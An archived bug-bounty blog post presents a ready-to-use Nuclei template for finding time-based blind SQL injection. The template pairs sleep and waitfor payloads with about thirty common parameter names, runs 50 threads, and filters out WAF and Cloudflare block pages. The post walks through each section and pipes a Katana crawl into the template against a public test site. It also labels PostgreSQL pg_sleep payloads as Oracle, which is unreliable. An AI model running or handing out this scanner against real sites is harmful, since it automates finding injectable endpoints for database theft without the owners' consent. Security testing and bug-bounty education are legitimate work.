# Bug Bounty

- **Source URL:** https://ac1d.medium.com/bug-bounty-automate-blind-sqli-3dcc4fa5d5?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20230531125635/https://ac1d.medium.com/bug-bounty-automate-blind-sqli-3dcc4fa5d5
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/2665 (id 2665)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
I wanted to share an epic win with you for you. A simple way to automate blind SQLi with [Nucle](https://github.com/projectdiscovery/nuclei)i.

To begin, let’s create a Nuclie template, but let’s make it a bit more advanced to leverage the clusterbomb method. This approach will allow us to effectively brute force the endpoints that pique our interest.

Github link to [sqli\_b\_sleep.yaml](https://github.com/AssassinUKG/Nuclei_public_templates/blob/main/blind_sqli/sqli_b_sleep.yaml)

```
id: blind-based-sqli
info:
  name: Blind based sqli (sleep)
  author: ac1d (Richard Jones ~ DefenceLogic.io)
  severity: critical
  description: url test for blind sleep payloads. 
  reference:
    - https://github.com/AssassinUKG
  tags: sqli,blind
requests:
  - method: GET
    path:
      - "{{BaseURL}}{{exts}}{{sleep_payload}}"
    #  - "{{BaseURL}}{{exts}}{{sleep_payload}}"
    payloads:
      sleep_payload:
        # mysql
        - (select*from(select(sleep(7)))a)
        - '%28select%2Afrom%28select%28sleep%287%29%29%29a%29'
        - "1%20OR%20ELT%28%5B33%5D%3D%5B33%5D%2CSLEEP%28%5B7%5D%29%29"
        - "1+AND+ELT%281337%3D1337%2CSLEEP%287%29%29"
        # MSSQL
        - ;waitfor delay '0:0:7'--
        - '%3Bwaitfor%20delay%20%270%3A0%3A7%27%2D%2D'
        # Oracle
        - 'select%201%20from%20pg%5Fsleep%287%29'
        - '%3B%28select%201%20from%20pg%5Fsleep%287%29%29'
        - '%7C%7C%28select%201%20from%20pg%5Fsleep%287%29%29'
      exts:
        - ?pid=
        - ?s=
        - ?search_id=
        - ?cat=
        - ?id=
        - ?page=
        - ?dir=
        - ?search=
        - ?category=
        - ?file=
        - ?class=
        - ?url=
        - ?news=
        - ?item=
        - ?menu=
        - ?lang=
        - ?name=
        - ?ref=
        - ?title=
        - ?view=
        - ?topic=
        - ?thread=
        - ?type=
        - ?date=
        - ?form=
        - ?join=
        - ?main=
        - ?nav=
        - ?region=
        - ?filename=
    attack: clusterbomb
    threads: 50
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration>=7 && duration<=8"
      - type: word
        words:
          - "Access Denied"
          - "Error 1006"
          - "Cloudflare"
          - "403 Forbidden"
        condition: or
        part: body
        negative: true
```
Wait what’s going on here, let’s break it down…

In the below image, you can see we are using only GET requests for now.

Think of the curly braces like replacement holders.

```
{{baseurl}}       = The url fed into nuclei to test.
{{exts}}          = A List of extensions to use in the clusterbomb attack
{{sleep_payload}}  = The payload to use from a list of payloads
```
You can update the template and learn more about templating with nuclei here: [https://nuclei.projectdiscovery.io/templating-guide/](https://nuclei.projectdiscovery.io/templating-guide/)

For the next section, we see payloads (more info: [https://nuclei.projectdiscovery.io/templating-guide/protocols/http/#http-payloads](https://nuclei.projectdiscovery.io/templating-guide/protocols/http/#http-payloads))

We can specify any payloads following the format in the link above, namely.

For the payloads for now I have only added a few, but you can add as many as you know and love

Next, we have the clusterbomb settings section.

This tells us the attack type with how many threads to run (to speed up the scan) and to make sure we stop on the first match, then continue to test the next URL.

Next, we set the matcher conditions. We use the DSL extractor to get more accurate results. With the dsl, we can access the duration of the request to see how long it takes. I’ve set all the payloads to seven seconds. Hence the duration is between seven and eight seconds for a match.

In this, the last section we are checking to make sure none of the words in the list are found. If all checks out at this point we should have a valid hit!

# **Testing the script!**

You can use nuclei in many ways, I prefer to test some scripts with [project discovery's](https://github.com/projectdiscovery) other tool, Katana.

Save the template above to a name you can remember: **sqli\_b\_sleep.yaml**

By utilizing Nuclei and Katana in tandem, we can identify potential vulnerabilities and assess the security of web applications effectively. This combined approach allows for thorough testing and provides valuable insights into the targets you’re attacking.

`katana -u http://testphp.vulnweb.com --silent | nuclei -u - -t sqli_b_sleep.yaml` It seems like everything is working smoothly. Now, armed with this method, you can effortlessly tackle those bounties on autopilot, at least for blind sqli.

And when you score a hit using this approach, don’t forget to remember me! Haha, I’d appreciate it. ;)

In addition to the methods mentioned above, these techniques can be applied to various other vulnerabilities and exploits. To explore more templates and gain a deeper understanding, I recommend checking out the nuclei templates repository. It contains a wide range of examples showcasing different attack types. You can find the repository on GitHub at this link: [https://github.com/projectdiscovery/nuclei-templates](https://github.com/projectdiscovery/nuclei-templates).

Thanks for reading and give a thumbs up if you liked the content!

EDIT: this script it not perfect and sometimes get false positives on Rate limited requests. Be warned. Log your traffic with burp or other tool.
